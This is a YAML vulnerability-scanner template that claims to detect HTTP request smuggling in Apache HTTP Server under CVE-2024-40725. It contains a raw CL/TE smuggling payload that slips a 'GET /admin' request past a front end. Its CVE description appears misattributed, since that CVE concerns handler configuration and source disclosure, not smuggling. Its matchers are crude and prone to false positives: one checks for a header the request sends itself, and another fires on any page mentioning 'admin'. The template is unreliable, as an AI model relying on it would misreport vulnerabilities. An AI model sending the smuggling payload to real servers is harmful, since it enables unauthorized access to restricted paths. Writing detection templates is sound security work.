id: CVE-2024-40725

info:
  name: HTTP Request Smuggling Detection
  author: lovelyspartan
  severity: high
  description: This template detects HTTP Request Smuggling vulnerability (CVE-2024-40725) in Apache HTTP Server.
  reference:
    - https://github.com/TAM-K592/CVE-2024-40725-CVE-2024-40898/blob/ALOK/CVE-2024-40725.py
    - https://www.cvedetails.com/cve/CVE-2024-40725
    - https://nvd.nist.gov/vuln/detail/CVE-2024-40725
  tags:
    - cve
    - http-smuggling
    - mod_proxy

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Connection: Keep-Alive, Proxy-Authenticate

    matchers:
      - type: regex
        part: header
        regex:
          - "Proxy-Authenticate"

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 0
        Transfer-Encoding: chunked

        0

        GET /admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: smuggle-test

    matchers:
      - type: word
        part: body
        words:
          - "admin"
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: header
        regex:
          - "Server: Apache/2\\.4\\.[0-5][0-9]"
          - "Server: Apache/2\\.4\\.6[0-1]"
        name: server_version
